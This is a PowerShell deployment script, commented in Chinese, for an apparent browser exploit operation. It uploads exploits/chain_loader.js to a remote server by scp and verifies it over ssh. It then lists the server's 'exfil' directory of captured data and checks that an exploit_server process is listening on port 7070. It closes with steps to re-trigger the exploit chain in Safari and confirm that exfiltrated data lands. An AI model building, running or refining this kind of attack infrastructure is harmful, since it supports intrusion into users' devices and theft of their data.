# DEPLOY_CHAINLOADER_FIX.ps1 — Windows 端版本
# 把本地最新 chain_loader.js 推到服务器, 验证版本, 列出 exfil 状态

param(
    [string]$Server = "root@aa1234.dpdns.org",
    [int]$Port = 22,
    [string]$RemoteRoot = "/www/wwwroot/coruna/server",
    [string]$LocalFile = "exploits\chain_loader.js"
)

$ErrorActionPreference = "Stop"

Write-Host "=== DEPLOY_CHAINLOADER_FIX.ps1 ===" -ForegroundColor Cyan

# 1) 本地文件特征检查
Write-Host "[1/5] 本地文件特征检查" -ForegroundColor Yellow
if (-not (Test-Path $LocalFile)) {
    Write-Host "  ✗ 找不到本地 $LocalFile" -ForegroundColor Red
    exit 1
}
$content = Get-Content $LocalFile -Raw
$hits = ([regex]::Matches($content, '_earlySoftFallback|_injectFallbackBridge')).Count
Write-Host "  本地 chain_loader.js 含 _earlySoftFallback 标记数: $hits"
if ($hits -lt 2) {
    Write-Host "  ✗ 本地 chain_loader.js 不是最新版本" -ForegroundColor Red
    exit 1
}
Write-Host "  ✓ 本地版本包含 SOFT-FALLBACK 修复" -ForegroundColor Green

# 2) 上传到服务器
Write-Host "[2/5] 上传到服务器 (scp)" -ForegroundColor Yellow
$remotePath = "${RemoteRoot}/exploits/chain_loader.js"
try {
    scp -P $Port $LocalFile "${Server}:${remotePath}"
    Write-Host "  ✓ scp 成功" -ForegroundColor Green
} catch {
    Write-Host "  ! scp 失败, 请检查 SSH 凭据和网络" -ForegroundColor Red
    Write-Host "    备用方案: 用 WinSCP 或宝塔面板手动上传到 $remotePath" -ForegroundColor Yellow
    exit 1
}

# 3) 服务器端版本验证
Write-Host "[3/5] 服务器端版本验证" -ForegroundColor Yellow
try {
    $remoteContent = ssh -p $Port $Server "cat ${remotePath}"
    $remoteHits = ([regex]::Matches($remoteContent, '_earlySoftFallback|_injectFallbackBridge')).Count
    Write-Host "  服务器 chain_loader.js 含 _earlySoftFallback 标记数: $remoteHits"
    if ($remoteHits -lt 2) {
        Write-Host "  ✗ 服务器版本不匹配, 部署失败" -ForegroundColor Red
        exit 1
    }
    Write-Host "  ✓ 服务器版本与本地一致" -ForegroundColor Green
} catch {
    Write-Host "  ! ssh 验证失败, 请手动检查服务器" -ForegroundColor Red
}

# 4) 服务器端 exfil 目录状态
Write-Host "[4/5] 服务器端 exfil 目录状态" -ForegroundColor Yellow
try {
    $exfilLs = ssh -p $Port $Server "ls -lt ${RemoteRoot}/exfil/ 2>/dev/null | head -15"
    Write-Host $exfilLs
    $exfilCount = ssh -p $Port $Server "ls ${RemoteRoot}/exfil/ 2>/dev/null | wc -l"
    Write-Host "  最近 exfil 文件数: $exfilCount"
} catch {
    Write-Host "  ! ssh 列表失败" -ForegroundColor Red
}

# 5) 检查 exploit_server 进程
Write-Host "[5/5] 检查 exploit_server 进程" -ForegroundColor Yellow
try {
    $ps = ssh -p $Port $Server "ps -ef | grep exploit_server | grep -v grep | head -5"
    Write-Host $ps
    $port = ssh -p $Port $Server "ss -tlnp 2>/dev/null | grep ':7070' || netstat -tlnp 2>/dev/null | grep ':7070'"
    Write-Host "  端口 7070: $port"
} catch {
    Write-Host "  ! 进程检查失败" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== 部署完成 ===" -ForegroundColor Cyan
Write-Host ""
Write-Host "下一步真机验证步骤:" -ForegroundColor Yellow
Write-Host "  1. Safari 强制刷新 group.html (Cmd+Shift+R 或 设置→清除历史与网站数据)"
Write-Host "  2. 重新触发 exploit 链"
Write-Host "  3. console 应该看到:"
Write-Host "     [CHAIN] SOFT-FALLBACK bridge IMMEDIATELY injected (locked via defineProperty)"
Write-Host "  4. dispatch ds_info, 验证 exfil 落盘 + dashboard 不再 File not found"
